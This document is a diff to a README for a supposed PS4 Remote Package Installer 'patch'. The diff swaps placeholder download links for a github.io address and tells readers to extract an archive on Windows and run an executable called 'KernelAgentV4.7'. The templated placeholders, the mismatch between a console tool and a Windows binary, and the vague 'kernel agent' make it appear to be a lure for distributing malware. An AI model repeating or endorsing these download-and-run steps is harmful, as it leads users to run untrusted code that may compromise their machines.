@@ -2,13 +2,15 @@
 
 Send and install `.pkg` games or homebrew apps over the network directly to your PS4 with Remote Package Installer. This patch improves compatibility, fixes transfer issues, and stabilizes connections. Powered by `KernelAgentV4.7`.
 
-[![Download RPI Patch](https://img.shields.io/badge/Download-RPI_Patch_PS4-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download RPI Patch](https://img.shields.io/badge/Download-RPI_Patch_PS4-blueviolet)](https://remote-package-installer-ps4-network.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://remote-package-installer-ps4-network.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\RPIFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The patch will auto-fix RPI file transfer settings and timeout behavior  
